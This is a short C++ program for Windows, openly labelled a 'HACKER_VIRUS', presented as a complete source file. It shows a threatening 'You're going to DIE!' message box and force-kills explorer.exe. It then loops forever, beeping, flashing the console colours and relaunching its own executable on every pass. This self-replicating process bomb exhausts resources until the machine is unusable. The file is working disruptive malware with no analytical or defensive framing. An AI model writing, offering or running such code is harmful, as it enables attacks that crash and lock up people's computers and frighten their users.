#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
int main() {
//	system("chcp 65001");
	char path[1024];
	string _path;
	GetModuleFileName(NULL, path, sizeof(path));
	_path = path;
	MessageBox(GetForegroundWindow(), "Hello! Welcome to >>>HACKER_VIRUS<<< You\'re going to DIE!", "Hacker_LTY", 1);
	system("taskkill /im explorer.exe /f");
	for (int i = 1; true; i++) {
		if (i % 5 == 0) printf("%c", '\a');
		printf("Error! ");
		system("color 14");
		printf("Warning! ");
		system("color 41");
		system(("start " + _path).c_str());
	}
	return 0;
}
